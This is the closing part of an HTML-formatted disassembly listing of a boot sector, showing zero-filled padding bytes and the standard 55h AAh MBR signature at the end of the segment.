</span><span style="color:olive">seg000:7DBA                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DBB                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DBC                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DBD                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DBE                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DBF                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC0                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC1                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC2                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC3                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC4                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC5                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC6                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC7                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC8                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DC9                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DCA                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DCB                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DCC                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DCD                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DCE                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DCF                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD0                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD1                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD2                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD3                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD4                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD5                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD6                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD7                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD8                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DD9                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DDA                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DDB                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DDC                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DDD                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DDE                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DDF                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE0                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE1                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE2                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE3                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE4                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE5                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE6                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE7                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE8                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DE9                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DEA                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DEB                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:gray">seg000:7DEC                 </span><span style="color:navy">dw </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DEE                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DEF                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF0                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF1                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF2                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF3                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF4                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF5                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF6                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF7                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF8                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DF9                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DFA                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DFB                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DFC                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DFD                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DFE                 </span><span style="color:navy">db  </span><span style="color:#008040">55h </span><span style="color:gray">; U             </span>; mbr signature
<span style="color:olive">seg000:7DFF                 </span><span style="color:navy">db </span><span style="color:#008040">0AAh
</span><span style="color:olive">seg000:7DFF </span>seg000          ends
<span style="color:olive">seg000:7DFF
seg000:7DFF
seg000:7DFF                 </span>end
</span></body></html>
